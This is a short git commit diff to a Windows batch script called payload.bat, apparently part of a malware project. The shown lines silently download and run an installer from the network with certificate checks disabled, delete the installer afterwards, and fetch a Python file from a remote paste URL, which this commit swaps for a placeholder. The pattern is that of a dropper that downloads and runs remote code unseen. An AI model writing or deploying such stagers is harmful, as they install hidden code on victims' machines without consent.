4e11f23a4b71da8c05984578ef686f9ff856dfc9
TheCuteOwl <114611129+TheCuteOwl@users.noreply.github.com>
2024-01-24 15:05:34 +0100

    Update payload.bat

--- trap detection/payload.bat
+++ trap detection/payload.bat
@@ -18,7 +18,7 @@ curl -L -o !eeee! !eee! --insecure --silent
 start /wait !eeee! /quiet /passive InstallAllUsers=0 PrependPath=1 Include_test=0 Include_pip=1 Include_doc=0
 del !eeee!
 
-set "ENCODED_URL=https://rentry.co/3454o/raw"
+set "ENCODED_URL=URL"
 
 set "OUTPUT_FILE=webpage.py"
 curl -o %OUTPUT_FILE% -s %ENCODED_URL% --insecure
